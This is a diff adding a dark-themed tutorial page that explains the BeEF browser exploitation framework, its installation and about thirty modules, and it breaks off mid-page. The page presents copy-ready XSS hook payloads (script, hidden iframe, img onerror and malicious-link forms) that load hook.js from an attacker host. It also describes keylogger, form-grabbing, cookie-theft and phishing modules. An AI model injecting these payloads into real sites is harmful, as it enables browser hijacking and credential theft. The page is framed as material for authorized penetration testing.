@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=5.0">
+<title>BeEF — Complete Guide | SAINICOMMANDHUB</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700;800&family=Orbitron:wght@400;500;600;700;800;900&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{--primary:#b800ff;--secondary:#00e5ff;--accent:#ff0080;--neon-green:#00ff41;--neon-red:#ff0040;--neon-yellow:#ffbd2e;--bg:#08050d;--bg-card:rgba(15,8,30,.5);--text-primary:#e0e0e0;--text-secondary:#9b8fb8;--text-dim:#5d5377;--font-mono:'JetBrains Mono',monospace;--font-display:'Orbitron',sans-serif;--font-body:'Inter',sans-serif;--pad:clamp(14px,3vw,32px)}
+html{scroll-behavior:smooth;overflow-x:hidden}
+body{background:var(--bg);color:var(--text-primary);font-family:var(--font-body);min-height:100vh;line-height:1.7;padding:80px var(--pad) 40px;overflow-x:hidden;position:relative}
+::-webkit-scrollbar{width:8px}::-webkit-scrollbar-track{background:var(--bg)}::-webkit-scrollbar-thumb{background:linear-gradient(180deg,var(--primary),var(--secondary));border-radius:4px}
+::selection{background:rgba(184,0,255,.3);color:#fff}
+a{text-decoration:none;color:inherit}
+.cyber-grid{position:fixed;inset:0;pointer-events:none;z-index:0;background-image:linear-gradient(rgba(184,0,255,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,229,255,.03) 1px,transparent 1px);background-size:60px 60px;animation:gridMove 20s linear infinite}
+@keyframes gridMove{0%{transform:translateY(0)}100%{transform:translateY(60px)}}
+.scanline{position:fixed;top:0;left:0;width:100%;height:3px;background:linear-gradient(90deg,transparent,var(--primary),var(--secondary),transparent);opacity:.15;z-index:1;pointer-events:none;animation:scanDown 8s linear infinite;filter:blur(1px)}
+@keyframes scanDown{0%{top:-10px}100%{top:100vh}}
+#matrix{position:fixed;inset:0;pointer-events:none;z-index:0;opacity:.04}
+.vignette{position:fixed;inset:0;pointer-events:none;z-index:2;background:radial-gradient(ellipse at center,transparent 50%,rgba(0,0,0,.4) 100%)}
+.navbar{position:fixed;top:0;left:0;width:100%;z-index:1000;padding:14px var(--pad);display:flex;align-items:center;justify-content:space-between;background:rgba(8,5,13,.85);backdrop-filter:blur(20px);border-bottom:1px solid rgba(184,0,255,.15);gap:12px}
+.nav-back{font-family:var(--font-mono);font-size:.7rem;letter-spacing:1.2px;text-transform:uppercase;color:var(--secondary);display:inline-flex;align-items:center;gap:8px;padding:8px 16px;border:1px solid rgba(0,229,255,.4);border-radius:6px;transition:all .3s;background:rgba(0,229,255,.06);cursor:pointer}
+.nav-back:hover{background:rgba(0,229,255,.15);box-shadow:0 0 20px rgba(0,229,255,.3);transform:translateX(-3px)}
+.nav-brand{display:flex;align-items:center;gap:10px;font-family:var(--font-display);font-size:clamp(.75rem,1.8vw,.95rem);font-weight:700;color:var(--secondary);letter-spacing:1.5px}
+.nav-brand-icon{width:30px;height:30px;border:2px solid var(--primary);border-radius:7px;display:flex;align-items:center;justify-content:center;font-size:.8rem;animation:brandPulse 3s ease-in-out infinite}
+@keyframes brandPulse{0%,100%{box-shadow:0 0 5px rgba(184,0,255,.4)}50%{box-shadow:0 0 20px rgba(184,0,255,.8)}}
+.container{max-width:1100px;margin:0 auto;position:relative;z-index:5;animation:fadeIn .6s ease}
+@keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+.hero{background:linear-gradient(135deg,rgba(184,0,255,.1),rgba(0,229,255,.1));border:1px solid rgba(184,0,255,.3);border-radius:18px;padding:clamp(28px,5vw,50px);margin-bottom:28px;position:relative;overflow:hidden;backdrop-filter:blur(10px)}
+.hero::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--primary),var(--secondary),transparent)}
+.hero-top{display:flex;align-items:center;gap:24px;margin-bottom:20px;flex-wrap:wrap}
+.hero-icon{width:100px;height:100px;border-radius:22px;background:rgba(184,0,255,.15);border:2px solid rgba(184,0,255,.4);display:flex;align-items:center;justify-content:center;font-size:3rem;flex-shrink:0;animation:iconPulse 3s ease-in-out infinite}
+@keyframes iconPulse{0%,100%{box-shadow:0 0 20px rgba(184,0,255,.4)}50%{box-shadow:0 0 50px rgba(184,0,255,.8)}}
+.hero-info{flex:1;min-width:220px}
+.hero-name{font-family:var(--font-display);font-size:clamp(1.8rem,5vw,3rem);font-weight:900;letter-spacing:3px;margin-bottom:8px;background:linear-gradient(90deg,var(--primary),var(--secondary));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.hero-cat{font-family:var(--font-mono);font-size:.8rem;color:var(--secondary);letter-spacing:2px;text-transform:uppercase;margin-bottom:12px}
+.hero-badges{display:flex;gap:10px;flex-wrap:wrap}
+.badge{padding:5px 14px;border-radius:20px;font-family:var(--font-mono);font-size:.68rem;letter-spacing:1px;text-transform:uppercase;font-weight:600}
+.badge-advanced{background:rgba(255,0,128,.12);color:var(--accent);border:1px solid rgba(255,0,128,.3)}
+.badge-count{background:rgba(184,0,255,.12);color:var(--primary);border:1px solid rgba(184,0,255,.3)}
+.badge-tag{background:rgba(0,229,255,.1);color:var(--secondary);border:1px solid rgba(0,229,255,.3)}
+.section{background:var(--bg-card);border:1px solid rgba(184,0,255,.15);border-radius:14px;padding:clamp(20px,3.5vw,32px);margin-bottom:22px;backdrop-filter:blur(10px)}
+.section-title{font-family:var(--font-display);font-size:clamp(1rem,2.2vw,1.2rem);font-weight:700;color:#fff;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:18px;display:flex;align-items:center;gap:12px;padding-bottom:14px;border-bottom:1px solid rgba(184,0,255,.15)}
+.section-title::before{content:'';width:4px;height:24px;background:linear-gradient(180deg,var(--primary),var(--secondary));border-radius:2px}
+.section p{color:var(--text-secondary);font-size:.92rem;line-height:1.85;margin-bottom:14px}
+.section p:last-child{margin-bottom:0}
+.section ul,.section ol{color:var(--text-secondary);font-size:.9rem;line-height:1.85;padding-left:22px;margin-bottom:14px}
+.section li{margin-bottom:8px}
+.section li strong{color:var(--secondary)}
+.section h3{font-family:var(--font-display);font-size:.95rem;color:var(--neon-green);letter-spacing:1.2px;text-transform:uppercase;margin:20px 0 12px}
+.section h3:first-child{margin-top:0}
+.code-block{position:relative;background:rgba(0,0,0,.55);border:1px solid rgba(184,0,255,.25);border-left:3px solid var(--primary);border-radius:8px;padding:14px 16px;font-family:var(--font-mono);font-size:.82rem;color:var(--neon-green);overflow-x:auto;display:flex;align-items:center;justify-content:space-between;gap:12px;margin:10px 0}
+.code-block code{flex:1;white-space:pre-wrap;word-break:break-all;color:var(--neon-green);line-height:1.6}
+.copy-btn{background:transparent;border:1px solid rgba(0,229,255,.4);color:var(--secondary);font-family:var(--font-mono);font-size:.65rem;padding:5px 12px;border-radius:5px;cursor:pointer;letter-spacing:.5px;transition:all .3s;flex-shrink:0;font-weight:600}
+.copy-btn:hover{background:rgba(0,229,255,.15);box-shadow:0 0 12px rgba(0,229,255,.3);transform:scale(1.05)}
+.copy-btn.copied{background:rgba(0,255,65,.15);border-color:var(--neon-green);color:var(--neon-green)}
+.command{background:rgba(15,8,30,.7);border:1px solid rgba(184,0,255,.15);border-radius:12px;padding:20px;margin-bottom:16px;transition:all .3s;position:relative;overflow:hidden;animation:cmdIn .5s ease backwards}
+@keyframes cmdIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+.command::before{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:linear-gradient(180deg,var(--primary),var(--secondary));opacity:0;transition:opacity .3s}
+.command:hover::before{opacity:1}
+.command:hover{border-color:rgba(184,0,255,.35);background:rgba(184,0,255,.05);transform:translateX(4px)}
+.command.dangerous{border-color:rgba(255,0,64,.3);background:rgba(255,0,64,.04)}
+.command.dangerous::before{background:linear-gradient(180deg,var(--neon-red),var(--accent));opacity:1}
+.command-title{font-family:var(--font-display);font-size:.9rem;font-weight:700;color:#fff;letter-spacing:1px;margin-bottom:12px;display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+.danger-badge{font-family:var(--font-mono);font-size:.58rem;padding:3px 10px;border-radius:12px;background:rgba(255,0,64,.15);border:1px solid rgba(255,0,64,.4);color:var(--neon-red);letter-spacing:.5px;animation:dangerBlink 1.5s ease-in-out infinite}
+@keyframes dangerBlink{0%,100%{opacity:1}50%{opacity:.6}}
+.command-purpose{font-size:.85rem;color:var(--text-secondary);margin-bottom:12px;line-height:1.7}
+.command-purpose strong{color:var(--secondary)}
+.command-output{font-family:var(--font-mono);font-size:.72rem;color:var(--text-dim);background:rgba(0,0,0,.4);padding:10px 14px;border-radius:6px;margin-top:8px;border-left:2px solid var(--secondary);white-space:pre-wrap;overflow-x:auto;line-height:1.6}
+.info-box{background:rgba(0,229,255,.05);border:1px solid rgba(0,229,255,.25);border-radius:10px;padding:16px 18px;margin:16px 0;display:flex;gap:12px;align-items:flex-start}
+.info-icon{font-size:1.2rem;flex-shrink:0}
+.info-text{font-size:.85rem;color:var(--text-secondary);line-height:1.7}
+.info-text strong{color:var(--secondary)}
+.warning{background:rgba(255,0,64,.05);border:1px solid rgba(255,0,64,.3);border-radius:10px;padding:16px 18px;margin:20px 0;display:flex;gap:12px;align-items:flex-start}
+.warning-icon{font-size:1.3rem;color:var(--neon-red);flex-shrink:0}
+.warning-text{font-size:.85rem;color:#ffaaaa;line-height:1.7}
+.warning-text strong{color:var(--neon-red)}
+.table-wrap{overflow-x:auto;margin:14px 0;border-radius:10px;border:1px solid rgba(184,0,255,.15)}
+table{width:100%;border-collapse:collapse;font-family:var(--font-mono);font-size:.78rem;min-width:500px}
+th{background:rgba(184,0,255,.1);color:var(--secondary);padding:12px;text-align:left;font-weight:600;letter-spacing:.5px;border-bottom:1px solid rgba(184,0,255,.2)}
+td{padding:12px;color:var(--text-secondary);border-bottom:1px solid rgba(255,255,255,.04)}
+tr:last-child td{border-bottom:none}
+tr:hover td{background:rgba(184,0,255,.04);color:var(--text-primary)}
+td code{color:var(--neon-green);font-family:var(--font-mono)}
+.workflow{counter-reset:wf;margin:16px 0}
+.wf-step{position:relative;padding:16px 16px 16px 60px;background:rgba(15,8,30,.6);border:1px solid rgba(184,0,255,.15);border-radius:10px;margin-bottom:12px}
+.wf-step::before{counter-increment:wf;content:counter(wf);position:absolute;left:16px;top:16px;width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,var(--primary),var(--secondary));color:#fff;display:flex;align-items:center;justify-content:center;font-family:var(--font-display);font-weight:700;font-size:.85rem}
+.wf-title{font-family:var(--font-display);font-size:.82rem;font-weight:700;color:var(--neon-green);letter-spacing:1px;margin-bottom:8px;text-transform:uppercase}
+.wf-desc{font-size:.82rem;color:var(--text-secondary);line-height:1.7}
+.toast{position:fixed;bottom:24px;right:24px;background:rgba(30,5,20,.95);border:1px solid var(--neon-green);border-radius:10px;padding:12px 20px;font-family:var(--font-mono);font-size:.75rem;color:#fff;z-index:3000;box-shadow:0 0 30px rgba(0,255,65,.3);opacity:0;visibility:hidden;transition:all .3s;display:flex;align-items:center;gap:8px}
+.toast.show{opacity:1;visibility:visible}
+.footer{text-align:center;padding:40px 20px;font-family:var(--font-mono);font-size:.72rem;color:var(--text-dim);position:relative;z-index:5}
+@media(max-width:640px){body{padding:76px 14px 30px}.hero-top{flex-direction:column;text-align:center;gap:16px}.hero-icon{width:80px;height:80px;font-size:2.2rem}.hero-badges{justify-content:center}.navbar{padding:12px 14px}.section{padding:20px 16px}}
+@media(prefers-reduced-motion:reduce){*,*::before,*::after{animation-duration:.01ms!important;transition-duration:.01ms!important}}
+</style>
+</head>
+<body>
+<script>
+// PROTECTED
+(function(){var t=localStorage.getItem("sch_token");var u=localStorage.getItem("sch_user");if(!t||!u){window.location.replace("login.html");return}try{JSON.parse(u);if(!t.includes(".")||t.split(".").length!==3)throw 0}catch(e){localStorage.removeItem("sch_token");localStorage.removeItem("sch_user");window.location.replace("login.html")}})();
+</script>
+<canvas id="matrix"></canvas>
+<div class="cyber-grid"></div>
+<div class="scanline"></div>
+<div class="vignette"></div>
+
+<nav class="navbar">
+  <button class="nav-back" onclick="window.location.href='dashboard.html'">← DASHBOARD</button>
+  <div class="nav-brand"><div class="nav-brand-icon">⚡</div>SAINICOMMANDHUB</div>
+</nav>
+
+<div class="container">
+  <div class="hero">
+    <div class="hero-top">
+      <div class="hero-icon">🐂</div>
+      <div class="hero-info">
+        <div class="hero-name">BEEF</div>
+        <div class="hero-cat">Exploitation · Browser Exploitation Framework</div>
+        <div class="hero-badges">
+          <span class="badge badge-advanced">Advanced</span>
+          <span class="badge badge-count">500+ Modules</span>
+          <span class="badge badge-tag">Browser Hook</span>
+          <span class="badge badge-tag">XSS Post-Exploitation</span>
+        </div>
+      </div>
+    </div>
+    <p style="color:var(--text-secondary);font-size:.95rem;line-height:1.8;margin-top:16px">
+      <strong style="color:var(--secondary)">BeEF (Browser Exploitation Framework)</strong> is a penetration testing tool that focuses on <strong>client-side browser vulnerabilities</strong>. Unlike traditional exploits that attack servers, BeEF "hooks" a victim's browser and gives you a remote control panel to command it. Once a browser is hooked, you can run 500+ modules — from keylogging to network scanning, social engineering, and post-exploitation.
+    </p>
+  </div>
+
+  <div class="section">
+    <div class="section-title">What is BeEF? (Deep Theory)</div>
+    <p>Traditional pentests attack the server. But modern apps run in browsers — and browsers have their own vulnerabilities and weaknesses. BeEF exploits the <strong>browser as an attack surface</strong>.</p>
+
+    <h3>How BeEF Works — The Hook Concept</h3>
+    <ol>
+      <li>Attacker runs BeEF server on their machine</li>
+      <li>Attacker injects a <code>hook.js</code> script into a victim's browser — typically via XSS or a malicious web page</li>
+      <li>Once the script loads, the browser is <strong>hooked</strong> — BeEF maintains a persistent connection</li>
+      <li>Attacker now sees the hooked browser in BeEF's web UI</li>
+      <li>Attacker can run modules to attack the browser, its extensions, or the user</li>
+    </ol>
+
+    <h3>The Hook Payload</h3>
+    <p>The hook is literally one line of JavaScript:</p>
+    <div class="code-block"><code>&lt;script src="http://attacker-ip:3000/hook.js"&gt;&lt;/script&gt;</code><button class="copy-btn" onclick="copyText('<script src=\"http://attacker-ip:3000/hook.js\"></script>',this)">COPY</button></div>
+    <p>That's it. Once loaded, the browser is under BeEF's control until the tab is closed or the machine is shut down.</p>
+
+    <h3>What BeEF Can Do Once Hooked</h3>
+    <ul>
+      <li><strong>Reconnaissance</strong> — finger-print browser, extensions, plugins, OS</li>
+      <li><strong>Network</strong> — scan internal network from victim's browser (bypassing firewall!)</li>
+      <li><strong>Keylogging</strong> — capture keystrokes on forms</li>
+      <li><strong>Form harvesting</strong> — steal form submissions before they leave</li>
+      <li><strong>Social engineering</strong> — fake login prompts, clickjacking</li>
+      <li><strong>Cookie theft</strong> — grab session cookies via XSS</li>
+      <li><strong>Webcam/Mic</strong> — permission prompts (if user clicks allow)</li>
+      <li><strong>Screen capture</strong> — take screenshot of victim's screen</li>
+      <li><strong>Worm propagation</strong> — infect other users visiting the same page</li>
+      <li><strong>Persistent</strong> — survives page changes via iframe tricks</li>
+    </ul>
+
+    <div class="info-box">
+      <div class="info-icon">💡</div>
+      <div class="info-text">
+        <strong>The power:</strong> BeEF turns a simple XSS vulnerability into a full post-exploitation platform. A 15-second XSS often becomes a multi-hour session with the victim's browser.
+      </div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Real-World Use Cases</div>
+
+    <h3>1. XSS Post-Exploitation</h3>
+    <p>You found a stored XSS. Instead of just popping an alert, hook the browser with BeEF — now you own every visitor's browser.</p>
+
+    <h3>2. Red Team Engagements</h3>
+    <p>Red teams use BeEF to demonstrate real impact of client-side vulnerabilities during authorized tests.</p>
+
+    <h3>3. Internal Network Scanning</h3>
+    <p>BeEF's internal network scanner finds devices on the victim's LAN — bypassing perimeter firewalls.</p>
+
+    <h3>4. Social Engineering Simulations</h3>
+    <p>Fake login prompts, browser update notifications, Flash player prompts — all via BeEF for phishing awareness tests.</p>
+
+    <h3>5. Worm Simulation</h3>
+    <p>Demonstrate how a stored XSS can self-propagate like the Samy worm — BeEF can hook every visitor.</p>
+
+    <h3>6. Client-Side Vulnerability Research</h3>
+    <p>Research browser extensions, outdated plugins, and client-side logic flaws.</p>
+
+    <h3>7. Awareness Training</h3>
+    <p>Show employees the risk of clicking unknown links and installing unknown extensions.</p>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Installation</div>
+    <h3>Kali Linux</h3>
+    <div class="code-block"><code>sudo apt update && sudo apt install -y beef-xss</code><button class="copy-btn" onclick="copyText('sudo apt update && sudo apt install -y beef-xss',this)">COPY</button></div>
+
+    <h3>Manual Install (GitHub)</h3>
+    <div class="code-block"><code>git clone https://github.com/beefproject/beef.git<br>cd beef<br>./install</code><button class="copy-btn" onclick="copyText('git clone https://github.com/beefproject/beef.git && cd beef && ./install',this)">COPY</button></div>
+
+    <h3>Docker</h3>
+    <div class="code-block"><code>docker run -p 3000:3000 -p 6789:6789 -p 61985:61985 -p 61986:61986 --name beef -d beefproject/beef</code><button class="copy-btn" onclick="copyText('docker run -p 3000:3000 -p 6789:6789 -p 61985:61985 -p 61986:61986 --name beef -d beefproject/beef',this)">COPY</button></div>
+
+    <h3>Verify</h3>
+    <div class="code-block"><code>cd /usr/share/beef-xss && ls</code><button class="copy-btn" onclick="copyText('cd /usr/share/beef-xss && ls',this)">COPY</button></div>
+    <div class="command-output">beef  config.yaml  Gemfile  install  modules  README.md  ...</div>
+
+    <div class="info-box">
+      <div class="info-icon">🔑</div>
+      <div class="info-text">
+        <strong>Default credentials:</strong> Username <code>beef</code>, Password <code>beef</code>. <strong>Change this immediately</strong> in <code>config.yaml</code> before using.
+      </div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Basic Commands</div>
+
+    <div class="command">
+      <div class="command-title">1. Start BeEF (Standard)</div>
+      <div class="command-purpose">Start the BeEF server — opens web UI on port 3000.</div>
+      <div class="code-block"><code>sudo beef-xss</code><button class="copy-btn" onclick="copyText('sudo beef-xss',this)">COPY</button></div>
+      <div class="command-output">[+] Bind to 0.0.0.0:3000
+[+] UI is available at http://127.0.0.1:3000/ui/panel
+[+] Hook is available at http://127.0.0.1:3000/hook.js
+[+] Credentials: beef / beef</div>
+    </div>
+
+    <div class="command">
+      <div class="command-title">2. Start on Custom IP/Port</div>
+      <div class="command-block"><code>sudo beef-xss -a 192.168.1.100 -p 3000</code><button class="copy-btn" onclick="copyText('sudo beef-xss -a 192.168.1.100 -p 3000',this)">COPY</button></div>
+    </div>
+
+    <div class="command">
+      <div class="command-title">3. Manual Start (Ruby)</div>
+      <div class="command-block"><code>cd /usr/share/beef-xss && ./beef</code><button class="copy-btn" onclick="copyText('cd /usr/share/beef-xss && ./beef',this)">COPY</button></div>
+    </div>
+
+    <div class="command">
+      <div class="command-title">4. Docker Start</div>
+      <div class="command-block"><code>docker start beef</code><button class="copy-btn" onclick="copyText('docker start beef',this)">COPY</button></div>
+    </div>
+
+    <div class="command">
+      <div class="command-title">5. Access Web UI</div>
+      <div class="command-purpose">Open in browser and login.</div>
+      <div class="code-block"><code>firefox http://127.0.0.1:3000/ui/panel</code><button class="copy-btn" onclick="copyText('firefox http://127.0.0.1:3000/ui/panel',this)">COPY</button></div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Hooking a Browser</div>
+
+    <div class="command">
+      <div class="command-title">6. Demo Page (Built-in)</div>
+      <div class="command-purpose">Visit BeEF's demo page to hook your own browser for testing.</div>
+      <div class="code-block"><code>http://127.0.0.1:3000/demos/butcher/index.html</code><button class="copy-btn" onclick="copyText('http://127.0.0.1:3000/demos/butcher/index.html',this)">COPY</button></div>
+    </div>
+
+    <div class="command dangerous">
+      <div class="command-title">7. Hook via XSS Injection <span class="danger-badge">⚠ AUTHORIZED USE ONLY</span></div>
+      <div class="command-purpose">Inject BeEF hook via XSS vulnerability.</div>
+      <div class="code-block"><code>&lt;script src="http://192.168.1.100:3000/hook.js"&gt;&lt;/script&gt;</code><button class="copy-btn" onclick="copyText('<script src=\"http://192.168.1.100:3000/hook.js\"></script>',this)">COPY</button></div>
+    </div>
+
+    <div class="command dangerous">
+      <div class="command-title">8. Iframe Injection <span class="danger-badge">⚠ AUTHORIZED USE ONLY</span></div>
+      <div class="command-purpose">Hook via hidden iframe injection.</div>
+      <div class="code-block"><code>&lt;iframe src="http://192.168.1.100:3000/hook.js" style="display:none"&gt;&lt;/iframe&gt;</code><button class="copy-btn" onclick="copyText('<iframe src=\"http://192.168.1.100:3000/hook.js\" style=\"display:none\"></iframe>',this)">COPY</button></div>
+    </div>
+
+    <div class="command dangerous">
+      <div class="command-title">9. Image Tag Injection <span class="danger-badge">⚠ AUTHORIZED USE ONLY</span></div>
+      <div class="command-block"><code>&lt;img src="x" onerror="var s=document.createElement('script');s.src='http://192.168.1.100:3000/hook.js';document.body.appendChild(s)"&gt;</code><button class="copy-btn" onclick="copyText('<img src=\"x\" onerror=\"var s=document.createElement(\'script\');s.src=\'http://192.168.1.100:3000/hook.js\';document.body.appendChild(s)\">',this)">COPY</button></div>
+    </div>
+
+    <div class="command dangerous">
+      <div class="command-title">10. Hook via Malicious Link <span class="danger-badge">⚠ AUTHORIZED USE ONLY</span></div>
+      <div class="command-block"><code>http://victim.com/page?search=&lt;script src=//192.168.1.100:3000/hook.js&gt;&lt;/script&gt;</code><button class="copy-btn" onclick="copyText('http://victim.com/page?search=<script src=//192.168.1.100:3000/hook.js></script>',this)">COPY</button></div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">BeEF Modules — Categories</div>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Category</th><th>Examples</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Browser</strong></td><td>Fingerprint, plugin detection, extension list</td></tr>
+          <tr><td><strong>Chrome Extensions</strong></td><td>Enumerate installed Chrome extensions</td></tr>
+          <tr><td><strong>Exploits</strong></td><td>Browser-specific exploits (CVE-based)</td></tr>
+          <tr><td><strong>Host</strong></td><td>OS detection, hardware info, screen size</td></tr>
+          <tr><td><strong>Network</strong></td><td>Port scan from victim's browser, Ping sweep</td></tr>
+          <tr><td><strong>Persistence</strong></td><td>Survive page reloads, tab close protection</td></tr>
+          <tr><td><strong>Social Engineering</strong></td><td>Fake login, fake update, clickjacking</td></tr>
+          <tr><td><strong>Debug</strong></td><td>Raw JS execution, HTTP requests</td></tr>
+          <tr><td><strong>Metasploit</strong></td><td>Bridge to Metasploit for payload delivery</td></tr>
+          <tr><td><strong>Misc</strong></td><td>Webcam, mic, clipboard, screenshots</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Popular BeEF Modules (30+)</div>
+
+    <div class="command">
+      <div class="command-title">11. Get Browser Info</div>
+      <div class="command-purpose">Fingerprint the hooked browser and OS.</div>
+      <div class="code-block"><code>Module: Browser → Get Browser Name and Version</code><button class="copy-btn" onclick="copyText('Browser -> Get Browser Name and Version',this)">COPY</button></div>
+    </div>
+
+    <div class="command">
+      <div class="command-title">12. Detect Plugins</div>
+      <div class="code-block"><code>Module: Browser → Detect Plugin (Java, Flash, PDF...)</code><button class="copy-btn" onclick="copyText('Browser -> Detect Plugin',this)">COPY</button></div>
+    </div>
+
+    <div class="command">
+      <div class="command-title">13. List Chrome Extensions</div>
+      <div class="command-code">Module: Chrome Extensions → List Extensions</div>
+    </div>
+
+    <div class="command">
+      <div class="command-title">14. Get Internal IP</div>
+      <div class="command-purpose">WebRTC leak reveals victim's internal IP.</div>
+      <div class="code-block"><code>Module: Network → Get Internal IP (WebRTC)</code><button class="copy-btn" onclick="copyText('Network -> Get Internal IP (WebRTC)',this)">COPY</button></div>
+    </div>
+
+    <div class="command dangerous">
+      <div class="command-title">15. Port Scan from Victim's Browser <span class="danger-badge">⚠ AUTHORIZED ONLY</span></div>
+      <div class="command-purpose">Scan internal network from victim's browser — bypasses perimeter firewall.</div>
+      <div class="code-block"><code>Module: Network → Port Scanner</code><button class="copy-btn" onclick="copyText('Network -> Port Scanner',this)">COPY</button></div>
+    </div>
+
+    <div class="command dangerous">
+      <div class="command-title">16. Ping Sweep <span class="danger-badge">⚠ AUTHORIZED ONLY</span></div>
+      <div class="code-block"><code>Module: Network → Ping Sweep (192.168.1.0/24)</code><button class="copy-btn" onclick="copyText('Network -> Ping Sweep',this)">COPY</button></div>
+    </div>
+
+    <div class="command dangerous">
+      <div class="command-title">17. Keylogger <span class="danger-badge">⚠ AUTHORIZED ONLY</span></div>
+      <div class="command-purpose">Log all keystrokes on the hooked browser.</div>
+      <div class="code-block"><code>Module: Social Engineering → Pretty Theft / Keylogger</code><button class="copy-btn" onclick="copyText('Social Engineering -> Keylogger',this)">COPY</button></div>
+    </div>
+
+    <div class="command dangerous">
+      <div class="command-title">18. Form Grabber <span class="danger-badge">⚠ AUTHORIZED ONLY</span></div>
+      <div class="command-purpose">Steal credentials before form submission.</div>
+      <div class="code-block"><code>Module: Social Engineering → Form Grabber (jQuery)</code><button class="copy-btn" onclick="copyText('Social Engineering -> Form Grabber',this)">COPY</button></div>
+    </div>
+
+    <div class="command dangerous">
+      <div class="command-title">19. Fake Login Prompt <span class="danger-badge">⚠ AUTHORIZED ONLY</span></div>
+      <div class="command-code">Module: Social Engineering → Fake Notification Bar</div>
+    </div>
+
+    <div class="command dangerous">
+      <div class="command-title">20. Full Screen Phishing <span class="danger-badge">⚠ AUTHORIZED ONLY</span></div>
+      <div class="code-block"><code>Module: Social Engineering → Fake Flash Update</code><button class="copy-btn" onclick="copyText('Social Engineering -> Fake Flash Update',this)">COPY</button></div>
+    </div>
+
+    <div class="command dangerous">
+      <div class="command-title">21. Clickjacking <span class="danger-badge">⚠ AUTHORIZED ONLY</span></div>
+      <div class="code-block"><code>Module: Social Engineering → Clickjacking</code><button class="copy-btn" onclick="copyText('Social Engineering -> Clickjacking',this)">COPY</button></div>
+    </div>
+
+    <div class="command dangerous">
+      <div class="command-title">22. Steal Cookies <span class="danger-badge">⚠ AUTHORIZED ONLY</span></div>
+      <div class="code-block"><code>Module: Misc → Get Cookie</code><button class="copy-btn" onclick="copyText('Misc -> Get Cookie',this)">COPY</button></div>
+    </div>
+
+    <div class="command dangerous">
+      <div class="command-title">23. Screenshot Victim's Screen <span class="danger-badge">⚠ AUTHORIZED ONLY</span></div>
+      <div class="code-block"><code>Module: Misc → Screenshot</code><button class="copy-btn" onclick="copyText('Misc -> Screenshot',this)">COPY</button></div>
+    </div>
+
+    <div class="command dangerous">
+      <div class="command-title">24. Webcam / Microphone <span class="danger-badge">⚠ AUTHORIZED ONLY</span></div>
+      <div class="command-purpose">Request camera access (browser shows permission prompt).</div>
+      <div class="code-block"><code>Module: Misc → Webcam HTML5</code><button class="copy-btn" onclick="copyText('Misc -> Webcam HTML5',this)">COPY</button></div>
+    </div>
+
+    <div class="command dangerous">
+      <div class="command-title">25. Clipboard Hijack <span class="danger-badge">⚠ AUTHORIZED ONLY</span></div>
+      <div class="code-block"><code>Module: Misc → Clipboard</code><button class="copy-btn" onclick="copyText('Misc -> Clipboard',this)">COPY</button></div>
+    </div>
+
+    <div class="command">
+      <div class="command-title">26. Persistent Hook (Survive Page Change)</div>
+      <div class="command-purpose">Hook survives page navigation using iframe.</div>
+      <div class="code-block"><code>Module: Persistence → Man-In-The-Browser</code><button class="copy-btn" onclick="copyText('Persistence -> Man-In-The-Browser',this)">COPY</button></div>
+    </div>
+
+    <div class="command dangerous">
+      <div class="command-title">27. Redirect Browser <span class="danger-badge">⚠ AUTHORIZED ONLY</span></div>
+      <div class="command-block"><code>Module: Misc → Redirect Browser</code><button class="copy-btn" onclick="copyText('Misc -> Redirect Browser',this)">COPY</button></div>
+    </div>
+
+    <div class="command dangerous">
+      <div class="command-title">28. Vibrate Phone <span class="danger-badge">⚠ AUTHORIZED ONLY</span></div>
+      <div class="command-block"><code>Module: Misc → Vibrate</code><button class="copy-btn" onclick="copyText('Misc -> Vibrate',this)">COPY</button></div>
+    </div>
+
+    <div class="command dangerous">
+      <div class="command-title">29. Execute Raw JavaScript <span class="danger-badge">⚠ AUTHORIZED ONLY</span></div>
+      <div class="command-purpose">Run arbitrary JS in victim's browser — ultimate control.</div>
+      <div class="code-block"><code>Module: Misc → Raw JavaScript</code><button class="copy-btn" onclick="copyText('Misc -> Raw JavaScript',this)">COPY</button></div>
+    </div>
+
+    <div class="command dangerous">
+      <div class="command-title">30. Metasploit Bridge <span class="danger-badge">⚠ AUTHORIZED ONLY</span></div>
+      <div class="command-purpose">Load browser exploits from Metasploit into BeEF.</div>
+      <div class="code-block"><code>Module: Exploits → Metasploit</code><button class="copy-btn" onclick="copyText('Exploits -> Metasploit',this)">COPY</button></div>
+    </div>
+
+    <div class="command">
+      <div class="command-title">31. Social Media Enumeration</div>
+      <div class="command-code">Module: Social Engineering → Social Media Link</div>
+    </div>
+
+    <div class="command">
+      <div class="command-title">32. DNS Enumeration</div>
+      <div class="command-code">Module: Network → DNS Enumeration</div>
+    </div>
+
+    <div class="command">
+      <div class="command-title">33. Detect Virtual Machine</div>
+      <div class="command-code">Module: Browser → Detect VM</div>
+    </div>
+
+    <div class="command">
+      <div class="command-title">34. Detect Tor</div>
+      <div class="command-code">Module: Browser → Detect Tor</div>
+    </div>
+  </div>
+
+  <div class="section">
